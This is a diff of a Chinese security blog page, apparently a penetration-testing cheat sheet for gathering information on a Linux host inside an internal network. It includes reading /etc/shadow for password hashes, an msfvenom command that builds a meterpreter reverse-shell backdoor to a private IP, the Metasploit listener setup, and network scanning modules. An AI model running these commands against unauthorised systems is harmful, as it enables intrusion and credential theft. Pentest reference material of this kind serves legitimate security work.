@@ -6,17 +6,18 @@
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="HandheldFriendly" content="True">
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
-    <meta name="description" content="Linux 内网本机信息收集速查 系统类型12cat &#x2F;etc&#x2F;issue查看系统名称    内核版本1uname –a 查看所有信息  用户1234whoamiidcat &#x2F;etc&#x2F;passwd #查看用户列表cat &#x2F;etc&#x2F;shadow #获取用户hash  进程1ps aux 查看进程信息  网卡1234&#x2F;etc&amp;#">
+    <meta name="description" content="Linux 内网本机信息收集速查 系统类型12cat &#x2F;etc&#x2F;issue查看系统名称  内核版本1uname –a 查看所有信息  用户1234whoamiidcat &#x2F;etc&#x2F;passwd #查看用户列表cat &#x2F;etc&#x2F;shadow #获取用户hash  进程1ps aux 查看进程信息  网卡1234&#x2F;etc&amp;#">
 <meta property="og:type" content="article">
 <meta property="og:title" content="Linux 内网本机信息收集速查">
 <meta property="og:url" content="https://godzeo.github.io/2020/06/23/Linux%20%E5%86%85%E7%BD%91%E6%9C%AC%E6%9C%BA%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E9%80%9F%E6%9F%A5/index.html">
 <meta property="og:site_name" content="Zeo 安全实验室">
-<meta property="og:description" content="Linux 内网本机信息收集速查 系统类型12cat &#x2F;etc&#x2F;issue查看系统名称    内核版本1uname –a 查看所有信息  用户1234whoamiidcat &#x2F;etc&#x2F;passwd #查看用户列表cat &#x2F;etc&#x2F;shadow #获取用户hash  进程1ps aux 查看进程信息  网卡1234&#x2F;etc&amp;#">
+<meta property="og:description" content="Linux 内网本机信息收集速查 系统类型12cat &#x2F;etc&#x2F;issue查看系统名称  内核版本1uname –a 查看所有信息  用户1234whoamiidcat &#x2F;etc&#x2F;passwd #查看用户列表cat &#x2F;etc&#x2F;shadow #获取用户hash  进程1ps aux 查看进程信息  网卡1234&#x2F;etc&amp;#">
 <meta property="og:locale" content="zh_CN">
 <meta property="article:published_time" content="2020-06-23T05:52:44.000Z">
-<meta property="article:modified_time" content="2020-07-04T09:00:06.010Z">
+<meta property="article:modified_time" content="2020-08-01T08:32:02.967Z">
 <meta property="article:author" content="Zeo">
 <meta property="article:tag" content="WEB安全">
+<meta property="article:tag" content="代码审计">
 <meta property="article:tag" content="内网">
 <meta property="article:tag" content="渗透">
 <meta property="article:tag" content="二进制">
@@ -54,6 +55,8 @@
     
     <!-- rss -->
     
+    
+      <link rel="alternate" href="/true" title="Zeo 安全实验室" type="application/atom+xml" />
     
 <meta name="generator" content="Hexo 4.2.0"></head>
 
@@ -162,10 +165,10 @@
   <div class="content" itemprop="articleBody">
     <a id="more"></a>
 
+
+
 <p>Linux 内网本机信息收集速查</p>
 <h4 id="系统类型"><a href="#系统类型" class="headerlink" title="系统类型"></a>系统类型</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cat &#x2F;etc&#x2F;issue</span><br><span class="line">查看系统名称</span><br></pre></td></tr></table></figure>
-
-
 
 <h4 id="内核版本"><a href="#内核版本" class="headerlink" title="内核版本"></a>内核版本</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname –a 查看所有信息</span><br></pre></td></tr></table></figure>
 
@@ -185,51 +188,45 @@
 
 <h4 id="软件信息"><a href="#软件信息" class="headerlink" title="软件信息"></a>软件信息</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">dpkg -l #查看安装的软件包</span><br><span class="line">rpm -qa #查看安装的软件包</span><br></pre></td></tr></table></figure>
 
-
-
 <h3 id="LINUX后门生成"><a href="#LINUX后门生成" class="headerlink" title="LINUX后门生成"></a>LINUX后门生成</h3><p>1.示例指令：</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p linux&#x2F;x86&#x2F;meterpreter&#x2F;reverse_tcp LHOST&#x3D;192.168.73.131 LPORT&#x3D;4444 -f elf &gt; root&#x2F;Desktop&#x2F;shell</span><br></pre></td></tr></table></figure>
 
-
-
 <p>2.配置<code>Metasploit</code>，<code>exploit</code>监听</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">search exploit&#x2F;hanler  &#x2F;&#x2F; (exploit&#x2F;multi&#x2F;handler：通用有效负载处理程序)</span><br><span class="line">use exploit&#x2F;multi&#x2F;handler        &#x2F;&#x2F; 使用模块</span><br><span class="line">show options         &#x2F;&#x2F; 配置</span><br><span class="line">set LHOST 192.168.73.131</span><br><span class="line">set payload linux&#x2F;x86&#x2F;meterpreter&#x2F;reverse_tcp         &#x2F;&#x2F; 设置测试的载荷</span><br><span class="line">exploit            &#x2F;&#x2F; 监听</span><br></pre></td></tr></table></figure>
-
-
 
 <p>nmap扫描：</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap ‐sP ‐PI 192.168.1.0&#x2F;24 ‐T4</span><br></pre></td></tr></table></figure>
 
 <p>端口扫描</p>
-<p>auxiliary/scanner/portscan<br> scanner/portscan/ack    ACK防火墙扫描<br> scanner/portscan/ftpbounce FTP跳端口扫描<br> scanner/portscan/syn    SYN端口扫描<br> scanner/portscan/tcp    TCP端口扫描<br> scanner/portscan/xmas    TCP”XMas”端口扫描</p>
+<p>auxiliary/scanner/portscan<br>scanner/portscan/ack ACK防火墙扫描<br>scanner/portscan/ftpbounce FTP跳端口扫描<br>scanner/portscan/syn SYN端口扫描<br>scanner/portscan/tcp TCP端口扫描<br>scanner/portscan/xmas TCP”XMas”端口扫描</p>
 <p>SMB扫描</p>
 <p><strong>scanner下模块，辅助发现内网存活主机，分别为：</strong></p>
 <ul>
-<li><p>auxiliary/scanner/discovery/arp_sweep </p>
+<li><p>auxiliary/scanner/discovery/arp_sweep</p>
 </li>
 <li><p>auxiliary/scanner/discovery/udp_sweep</p>
 </li>
-<li><p>auxiliary/scanner/ftp/ftp_version </p>
+<li><p>auxiliary/scanner/ftp/ftp_version</p>
 </li>
 <li><p>auxiliary/scanner/http/http_version</p>
 </li>
 <li><p>auxiliary/scanner/smb/smb_version</p>
 </li>
-<li><p>auxiliary/scanner/ssh/ssh_version </p>
+<li><p>auxiliary/scanner/ssh/ssh_version</p>
 </li>
 <li><p>auxiliary/scanner/telnet/telnet_version</p>
 </li>
-<li><p>auxiliary/scanner/discovery/udp_probe </p>
+<li><p>auxiliary/scanner/discovery/udp_probe</p>
 </li>
 <li><p>auxiliary/scanner/dns/dns_amp</p>
 </li>
 <li><p>auxiliary/scanner/mysql/mysql_version</p>
 </li>
-<li><p>auxiliary/scanner/netbios/nbname </p>
+<li><p>auxiliary/scanner/netbios/nbname</p>
 </li>
 <li><p>auxiliary/scanner/http/title</p>
 </li>
-<li><p>auxiliary/scanner/db2/db2_version </p>
+<li><p>auxiliary/scanner/db2/db2_version</p>
 </li>
 <li><p>auxiliary/scanner/portscan/ack</p>
 </li>
